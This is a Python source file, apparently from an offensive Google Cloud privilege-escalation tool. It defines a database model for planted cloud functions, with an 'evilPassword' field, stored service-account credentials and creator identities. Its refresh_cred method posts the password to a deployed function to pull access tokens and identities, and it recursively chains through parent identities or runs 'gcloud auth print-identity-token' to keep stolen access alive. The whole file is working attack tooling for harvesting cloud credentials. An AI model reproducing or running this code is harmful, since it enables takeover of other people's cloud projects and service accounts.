from sqlalchemy import Column, Integer, String
import urllib
import json
from sqlalchemy.ext.declarative import declarative_base
Base = declarative_base()

class CloudFunction(Base):
    __tablename__ = 'cloudfunctions'

    id = Column(Integer, primary_key=True)
    project = Column(String)
    role = Column(String)
    serviceAccount = Column(String)
    evilPassword = Column(String)
    name = Column(String)
    cred = Column(String)
    identity = Column(String)
    creator_identity = Column(String)
    creator_email = Column(String)
    infastructure = Column(String)

    def __repr__(self):
        return "name='%s', role='%s', serviceAccount='%s', project='%s', password='%s'" % (
            self.name, self.role, self.serviceAccount, self.project, self.evilPassword)
    def refresh_cred(self, db_session, run_local, dataproc=None):
        if self.infastructure == "cloud_function":
            print(self.serviceAccount)
            print("refreshing cred")
            password = self.evilPassword
            function_url = "https://us-central1-{}.cloudfunctions.net/{}".format(self.project, self.name)
            body = {"password": password, "get_token": True}
            req = urllib.request.Request(function_url)
            req.add_header('Content-Type', 'application/json; charset=utf-8')
            req.add_header('Authorization', 'bearer {}'.format(self.creator_identity))
            jsondata = json.dumps(body)
            jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
            req.add_header('Content-Length', len(jsondataasbytes))
            try:
                response = urllib.request.urlopen(req, jsondataasbytes)
                if response.getcode() == 200:
                    raw_token = response.read()
                    auth_token = json.loads(raw_token)
                    token = auth_token["access_token"]
                    self.cred = token
                    self.identity = auth_token["identity"]
                    return auth_token["identity"]
            except urllib.error.HTTPError:
                print("refreshing parent")
            if self.creator_email:
                self.creator_identity = db_session.query(CloudFunction).filter_by(serviceAccount=self.creator_email).first().refresh_cred(db_session, run_local)
            else:
                self.creator_identity = run_local("gcloud auth print-identity-token")
            return self.refresh_cred(db_session, run_local)
        elif self.infastructure == "dataproc":
            if not self.creator_email:
                dataproc(project=self.project, refresh=self)
            else:
                creator = db_session.query(CloudFunction).filter_by(serviceAccount=self.creator_email).first()
                return dataproc(source_name=creator.name, project=self.project, refresh=self)


def init_db(engine):
    Base.metadata.create_all(engine)
